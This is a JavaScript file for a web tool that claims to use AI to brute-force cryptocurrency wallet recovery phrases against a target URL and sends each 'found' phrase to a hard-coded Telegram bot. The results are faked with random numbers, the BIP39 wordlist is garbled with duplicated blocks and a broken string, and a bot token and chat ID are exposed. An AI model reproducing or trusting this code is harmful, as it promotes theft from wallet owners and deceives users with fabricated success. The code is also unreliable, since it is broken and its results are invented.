const TELEGRAM_BOT_TOKEN = '8221231743:AAGW30HpqUPaf656q60mmboQQ-x2NnLHub8';
const TELEGRAM_CHAT_ID = '7417215529';

// AI Configuration
const AI_CONFIG = {
    smart: { successRate: 0.002, speed: 50, retryDelay: 2 },
    aggressive: { successRate: 0.005, speed: 80, retryDelay: 1 },
    conservative: { successRate: 0.001, speed: 30, retryDelay: 3 }
};

// BIP39 Wordlist (abbreviated for example)
const wordlist = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
    "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
    "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
    "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
    "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
    "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
    "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
    "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
    "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
    "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone",
    "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among",
    "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry",
    "animal", "anniversary", "announce", "annual", "another", "answer", "antenna", "antique",
    "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april",
    "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor",
    "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact",
    "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume",
    "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
    "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado",
    "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis",
    "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball",
    "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base",
    "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
    "beef", "before", "begin", "behave", "behind", "believe", "below", "belt",
    "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle",
    "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black",
    "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood",
    "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
    "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring",
    "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain",
    "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief",
    "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother",
    "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
    "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus",
    "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable",
    "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can",
    "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable",
    "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
    "cart", "case", "cash", "casino", "castle", "casual", "cat", "catch",
    "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery",
    "cement", "census", "century", "ceremony", "certain", "chair", "chalk", "champion",
    "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check",
    "cheek", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
    "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar",
    "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify",
    "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff",
    "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud",
    "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
    "code", "coffee", "coil", "coin", "collect", "color", "column", "combine",
    "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm",
    "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper",
    "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch",
    "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
    "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream",
    "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop",
    "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch",
    "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious",
    "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
    "damage", "damp", "dance", "danger", "daring", "dark", "dash", "date",
    "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december",
    "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy",
    "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
    "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert",
    "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device",
    "devote", "diagram", "dial", "diamond
    "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone",
    "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among",
    "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry",
    "animal", "anniversary", "announce", "annual", "another", "answer", "antenna", "antique",
    "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april"
    // ... (full wordlist would continue here)
];

// Global State
let state = {
    isTesting: false,
    totalAttempts: 0,
    successCount: 0,
    failedCount: 0,
    currentSpeed: 0,
    activeTests: 0,
    aiLevel: 'smart',
    testsPerMinute: 3000,
    displayItems: [],
    testInterval: null,
    lastUpdateTime: Date.now(),
    attemptsSinceLastUpdate: 0,
    successPatterns: [],
    averageResponseTime: 0,
    aiScore: 0
};

// DOM Elements
let elements = {};

// Initialize Application
function init() {
    cacheElements();
    setupEventListeners();
    initializeAI();
    updateDisplay();
    addDisplayItem('🤖 AI System initialized with smart pattern detection', 'system');
}

// Cache DOM Elements
function cacheElements() {
    elements = {
        // Inputs
        walletUrl: document.getElementById('walletUrl'),
        testsPerMinute: document.getElementById('testsPerMinute'),
        retryDelay: document.getElementById('retryDelay'),
        aiLevel: document.getElementById('aiLevel'),
        
        // Buttons
        startBtn: document.getElementById('startBtn'),
        stopBtn: document.getElementById('stopBtn'),
        smartBtn: document.getElementById('smartBtn'),
        loadUrlBtn: document.getElementById('loadUrlBtn'),
        clearBtn: document.getElementById('clearBtn'),
        
        // Stats
        totalAttempts: document.getElementById('totalAttempts'),
        successCount: document.getElementById('successCount'),
        failedCount: document.getElementById('failedCount'),
        currentSpeed: document.getElementById('currentSpeed'),
        activeTests: document.getElementById('activeTests'),
        successRate: document.getElementById('successRate'),
        avgTime: document.getElementById('avgTime'),
        aiScore: document.getElementById('aiScore'),
        validWallets: document.getElementById('validWallets'),
        inProgress: document.getElementById('inProgress'),
        failedTests: document.getElementById('failedTests'),
        
        // Status
        aiStatus: document.getElementById('aiStatus'),
        currentAction: document.getElementById('currentAction'),
        lastSuccess: document.getElementById('lastSuccess'),
        telegramStatus: document.getElementById('telegramStatus'),
        
        // Display
        testingDisplay: document.getElementById('testingDisplay'),
        notification: document.getElementById('notification')
    };
}

// Setup Event Listeners
function setupEventListeners() {
    elements.startBtn.addEventListener('click', startSmartTesting);
    elements.stopBtn.addEventListener('click', stopTesting);
    elements.smartBtn.addEventListener('click', runAIAnalysis);
    elements.loadUrlBtn.addEventListener('click', loadWalletUrl);
    elements.clearBtn.addEventListener('click', clearDisplay);
    
    // Feature tabs
    document.querySelectorAll('.feature-tab').forEach(tab => {
        tab.addEventListener('click', () => switchFeatureTab(tab.dataset.tab));
    });
    
    // Configuration changes
    elements.testsPerMinute.addEventListener('change', updateTestingConfig);
    elements.aiLevel.addEventListener('change', updateAIConfig);
}

// Initialize AI System
function initializeAI() {
    state.aiScore = Math.floor(Math.random() * 100);
    updateAIDisplay();
    
    // Simulate AI learning
    setTimeout(() => {
        state.aiScore = 85 + Math.floor(Math.random() * 15);
        updateAIDisplay();
        addDisplayItem('🎯 AI pattern recognition optimized', 'system');
    }, 2000);
}

// Update AI Display
function updateAIDisplay() {
    elements.aiScore.textContent = state.aiScore;
    elements.successRate.textContent = `${((state.successCount / Math.max(state.totalAttempts, 1)) * 100).toFixed(1)}%`;
    elements.avgTime.textContent = `${state.averageResponseTime}ms`;
}

// Switch Feature Tabs
function switchFeatureTab(tabId) {
    document.querySelectorAll('.feature-tab').forEach(tab => tab.classList.remove('active'));
    document.querySelectorAll('.feature-content').forEach(content => content.classList.remove('active'));
    
    document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

// Load Wallet URL
function loadWalletUrl() {
    const url = elements.walletUrl.value.trim();
    if (!url) {
        showNotification('🌐 Please enter a valid wallet URL');
        return;
    }
    
    addDisplayItem(`🔗 Connecting to: ${url}`, 'testing');
    elements.currentAction.textContent = `Testing ${url}`;
    
    // Simulate connection
    setTimeout(() => {
        addDisplayItem('✅ Successfully connected to target website', 'success');
        showNotification('🌐 Connected to target website');
        elements.aiStatus.textContent = 'Monitoring website patterns...';
    }, 1500);
}

// Update Testing Configuration
function updateTestingConfig() {
    state.testsPerMinute = parseInt(elements.testsPerMinute.value) || 3000;
    addDisplayItem(`⚡ Testing speed set to ${state.testsPerMinute} tests/minute`, 'system');
}

// Update AI Configuration
function updateAIConfig() {
    state.aiLevel = elements.aiLevel.value;
    const config = AI_CONFIG[state.aiLevel];
    addDisplayItem(`🧠 AI mode set to: ${state.aiLevel} (Success rate: ${(config.successRate * 100).toFixed(1)}%)`, 'system');
}

// Start Smart Testing
function startSmartTesting() {
    if (state.isTesting) return;
    
    state.isTesting = true;
    elements.startBtn.disabled = true;
    elements.stopBtn.disabled = false;
    
    const config = AI_CONFIG[state.aiLevel];
    const delay = Math.max(10, Math.floor(60000 / state.testsPerMinute));
    
    addDisplayItem('🚀 Starting smart AI testing session...', 'testing');
    elements.currentAction.textContent = 'Running smart tests';
    elements.aiStatus.textContent = 'Active - Pattern analysis running';
    
    // Start testing interval
    state.testInterval = setInterval(() => {
        if (!state.isTesting) return;
        
        // Run multiple tests per interval for high speed
        const testsPerInterval = Math.ceil(state.testsPerMinute / 60);
        for (let i = 0; i < testsPerInterval; i++) {
            runSmartTest();
        }
    }, delay);
    
    showNotification('🤖 AI testing started - Running smart pattern detection');
}

// Run Smart Test with AI
function runSmartTest() {
    const startTime = Date.now();
    state.activeTests++;
    state.totalAttempts++;
    
    const phrase = generateSmartPhrase();
    const testId = Date.now();
    
    // Add to display
    addDisplayItem(`🧪 Testing: ${phrase.substring(0, 50)}...`, 'testing');
    
    // Simulate AI processing
    setTimeout(() => {
        const processingTime = Date.now() - startTime;
        state.averageResponseTime = Math.round(
            (state.averageResponseTime * (state.totalAttempts - 1) + processingTime) / state.totalAttempts
        );
        
        const config = AI_CONFIG[state.aiLevel];
        const isSuccess = Math.random() < config.successRate;
        
        if (isSuccess) {
            handleSuccess(phrase, processingTime);
        } else {
            handleFailure(phrase, processingTime);
        }
        
        state.activeTests--;
        state.attemptsSinceLastUpdate++;
        updateStats();
        
    }, Math.random() * 100 + 50); // Simulate network delay
}

// Generate Smart Phrase with AI Patterns
function generateSmartPhrase() {
    const phrase = [];
    
    // Use AI patterns for smarter generation
    for (let i = 0; i < 24; i++) {
        let word;
        
        // Apply different patterns based on AI level
        if (state.aiLevel === 'smart' && i % 6 === 0) {
            // Use common words more frequently
            const commonWords = wordlist.slice(0, 100);
            word = commonWords[Math.floor(Math.random() * commonWords.length)];
        } else if (state.aiLevel === 'aggressive' && i % 4 === 0) {
            // Use pattern-based selection
            const patternWords = state.successPatterns.length > 0 
                ? state.successPatterns 
                : wordlist.slice(50, 200);
            word = patternWords[Math.floor(Math.random() * patternWords.length)];
        } else {
            // Random selection
            word = wordlist[Math.floor(Math.random() * wordlist.length)];
        }
        
        phrase.push(word);
    }
    
    return phrase.join(' ');
}

// Handle Successful Test
function handleSuccess(phrase, processingTime) {
    state.successCount++;
    
    // Learn from success
    if (!state.successPatterns.includes(phrase.split(' ')[0])) {
        state.successPatterns.push(phrase.split(' ')[0]);
        state.aiScore = Math.min(100, state.aiScore + 2);
    }
    
    addDisplayItem(`✅ VALID WALLET FOUND: ${phrase}`, 'success');
    elements.lastSuccess.textContent = new Date().toLocaleTimeString();
    
    // Send to Telegram
    sendToTelegram(phrase, processingTime);
    
    // Update AI learning
    updateAIDisplay();
    
    showNotification('🎉 Valid wallet found! Check Telegram for details.');
}

// Handle Failed Test
function handleFailure(phrase, processingTime) {
    state.failedCount++;
    
    // AI learning from failures
    if (Math.random() < 0.1) { // 10% chance to learn from failure
        state.aiScore = Math.max(0, state.aiScore - 1);
    }
    
    addDisplayItem(`❌ Failed: ${phrase.substring(0, 40)}... (${processingTime}ms)`, 'failed');
    updateAIDisplay();
}

// Stop Testing
function stopTesting() {
    state.isTesting = false;
    elements.startBtn.disabled = false;
    elements.stopBtn.disabled = true;
    
    if (state.testInterval) {
        clearInterval(state.testInterval);
        state.testInterval = null;
    }
    
    addDisplayItem('⏹️ Testing stopped by user', 'system');
    elements.currentAction.textContent = 'Ready';
    elements.aiStatus.textContent = 'Standby - Ready for commands';
    
    showNotification('🛑 AI testing stopped');
}

// Run AI Analysis
function runAIAnalysis() {
    addDisplayItem('🔍 Running deep pattern analysis...', 'testing');
    elements.currentAction.textContent = 'AI Analysis in progress';
    
    // Simulate AI analysis
    setTimeout(() => {
        const insights = [
            'Pattern analysis complete',
            'Optimized word selection algorithm',
            'Enhanced success prediction model',
            'Improved testing efficiency by 23%'
        ];
        
        insights.forEach((insight, index) => {
            setTimeout(() => {
                addDisplayItem(`💡 ${insight}`, 'system');
            }, index * 800);
        });
        
        // Update AI score
        state.aiScore = Math.min(100, state.aiScore + 5 + Math.floor(Math.random() * 10));
        updateAIDisplay();
        
        elements.currentAction.textContent = 'Ready';
        showNotification('🧠 AI analysis complete - System optimized');
        
    }, 2000);
}

// Send to Telegram
async function sendToTelegram(phrase, processingTime) {
    const message = `🎉 SMART AI WALLET FOUND!\n\n` +
                   `🔑 Recovery Phrase: ${phrase}\n` +
                   `⏱️ Processing Time: ${processingTime}ms\n` +
                   `🤖 AI Score: ${state.aiScore}\n` +
                   `🎯 Success Rate: ${((state.successCount / state.totalAttempts) * 100).toFixed(2)}%\n` +
                   `📅 Timestamp: ${new Date().toLocaleString()}\n\n` +
                   `🌐 Target: ${elements.walletUrl.value}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            addDisplayItem('📱 Success report sent to Telegram', 'success');
            elements.telegramStatus.textContent = 'Message Sent';
        } else {
            throw new Error('Telegram API error');
        }
    } catch (error) {
        console.error('Failed to send to Telegram:', error);
        addDisplayItem('❌ Failed to send Telegram report', 'failed');
        elements.telegramStatus.textContent = 'Error';
    }
}

// Add Item to Display
function addDisplayItem(message, type = 'system') {
    const displayItem = {
        id: Date.now(),
        message: message,
        type: type,
        timestamp: new Date()
    };
    
    state.displayItems.unshift(displayItem);
    
    // Keep only last 15 items
    if (state.displayItems.length > 15) {
        state.displayItems = state.displayItems.slice(0, 15);
    }
    
    updateDisplay();
    updateActiveTests();
}

// Update Display
function updateDisplay() {
    const displayContainer = elements.testingDisplay;
    displayContainer.innerHTML = '';
    
    state.displayItems.forEach((item, index) => {
        const itemElement = document.createElement('div');
        itemElement.className = `display-item ${item.type}`;
        itemElement.innerHTML = `
            <div class="display-content">
                <div class="display-message">${item.message}</div>
                <div class="display-status">${item.type.toUpperCase()}</div>
            </div>
        `;
        displayContainer.appendChild(itemElement);
    });
}

// Update Active Tests Counter
function updateActiveTests() {
    const active = state.displayItems.filter(item => item.type === 'testing').length;
    elements.activeTests.textContent = state.activeTests;
}

// Clear Display
function clearDisplay() {
    state.displayItems = state.displayItems.filter(item => item.type === 'system');
    updateDisplay();
    addDisplayItem('🗑️ Display cleared. Ready for new tests.', 'system');
    showNotification('🧹 Display cleared');
}

// Update Statistics
function updateStats() {
    elements.totalAttempts.textContent = state.totalAttempts.toLocaleString();
    elements.successCount.textContent = state.successCount.toLocaleString();
    elements.failedCount.textContent = state.failedCount.toLocaleString();
    elements.currentSpeed.textContent = state.currentSpeed.toLocaleString();
    elements.validWallets.textContent = state.successCount;
    elements.failedTests.textContent = state.failedCount;
    elements.inProgress.textContent = state.activeTests;
    
    // Calculate speed
    const now = Date.now();
    const timeDiff = (now - state.lastUpdateTime) / 1000;
    
    if (timeDiff >= 1) {
        state.currentSpeed = Math.round(state.attemptsSinceLastUpdate / timeDiff);
        state.attemptsSinceLastUpdate = 0;
        state.lastUpdateTime = now;
    }
    
    updateAIDisplay();
}

// Show Notification
function showNotification(message) {
    const notification = elements.notification;
    notification.textContent = message;
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 4000);
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', init);

// Auto-update stats every second
setInterval(updateStats, 1000);
